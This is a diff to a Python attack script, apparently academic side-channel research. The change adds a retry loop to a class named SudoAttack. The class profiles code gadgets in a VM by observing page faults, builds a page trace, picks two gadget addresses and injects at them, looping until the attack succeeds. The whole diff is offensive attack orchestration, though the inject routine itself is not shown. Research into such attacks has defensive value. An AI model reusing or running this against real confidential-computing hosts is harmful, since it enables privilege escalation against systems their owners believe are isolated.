@@ -398,56 +398,69 @@ class SudoAttack:
         print(f"Collected {len(exclude_list)} exclude pages \[include: {len(total_include_set)},"
               f" exclude: {len(total_exclude_set)}]")
 
-        #
-        # Profile Gadgets (ping pong)
-        #
-        time.sleep(3)
-        console.rule("Profiling gadgets (S_App)")
-        print("Log into VM and execute gadget profiling.")
-        Confirm.ask("Press key when done...", choices=[''])
+        init_total_exclude_set = OrderedSet(total_exclude_set)
+        init_total_include_set = OrderedSet(total_include_set)
+        
+        # Try until success
+        while True:
+            total_exclude_set = init_total_exclude_set
+            total_include_set = init_total_include_set
 
-        print("Listen for pagefaults...")
+            #
+            # Profile Gadgets (ping pong)
+            #
+            time.sleep(3)
+            console.rule("Profiling gadgets (S_App)")
+            print("Log into VM and execute gadget profiling.")
+            Confirm.ask("Press key when done...", choices=[''])
 
-        track_once = self.track_ping_pong_once(timeout=2)
-        include_set = track_once['run_set']
-        include_set.difference_update(total_exclude_set)
-        self._dump('track_once', track_once)
-        total_include_set.update(include_set)
+            print("Listen for pagefaults...")
 
-        print(f"Collected {len(include_set)} include pages \[include: {len(total_include_set)},"
-              f" exclude: {len(total_exclude_set)}]")
+            track_once = self.track_ping_pong_once(timeout=2)
+            include_set = track_once['run_set']
+            include_set.difference_update(total_exclude_set)
+            self._dump('track_once', track_once)
+            total_include_set.update(include_set)
 
-        #
-        # Create Application Trace
-        #
-        time.sleep(3)
-        console.rule(f"Profiling application trace (PT_App with |S_App|={len(total_include_set)})")
-        track_trace = self.track_ping_pong_trace(total_include_set, timeout=3, max_hit=None)
-        trace_list = track_trace['run_list']
-        pfs = track_trace['pfs']
-        self._dump('track_trace', track_trace)
+            print(f"Collected {len(include_set)} include pages \[include: {len(total_include_set)},"
+                f" exclude: {len(total_exclude_set)}]")
 
-        print(f"Collected trace of {len(trace_list)} pages (PT_App)")
+            #
+            # Create Application Trace
+            #
+            time.sleep(3)
+            console.rule(f"Profiling application trace (PT_App with |S_App|={len(total_include_set)})")
+            track_trace = self.track_ping_pong_trace(total_include_set, timeout=3, max_hit=None)
+            trace_list = track_trace['run_list']
+            pfs = track_trace['pfs']
+            self._dump('track_trace', track_trace)
 
-        #
-        # Find gadgets
-        #
-        print("Found gadgets:")
-        pf_sorted = sorted(pfs.items(), key=lambda item: item[1])
-        s = {k: v for k, v in pf_sorted}
-        for k in s.keys():
-            print(f"   - gadget: {hex(k)}={s[k]}")
-        gad1, gad2 = self.find_gadgets(pfs)
+            print(f"Collected trace of {len(trace_list)} pages (PT_App)")
 
-        #
-        # Inject
-        #
-        if gad1 is not None:
-            print(f"Target gadget identified: {hex(gad1)}, {hex(gad2)}")
-            self.inject(gad1, gad2)
-            print("Done.")
-        else:
-            print("Attack failed. Retry again")
+            #
+            # Find gadgets
+            #
+            print("Found gadgets:")
+            pf_sorted = sorted(pfs.items(), key=lambda item: item[1])
+            s = {k: v for k, v in pf_sorted}
+            for k in s.keys():
+                print(f"   - gadget: {hex(k)}={s[k]}")
+            gad1, gad2 = self.find_gadgets(pfs)
+
+            #
+            # Inject
+            #
+            if gad1 is not None:
+                print(f"Target gadget identified: {hex(gad1)}, {hex(gad2)}")
+                self.inject(gad1, gad2)
+
+                #
+                # Success
+                # 
+                print("Done.")
+                break
+            else:
+                print("Attack failed. Retry again")
 
 
 def __test_inject():
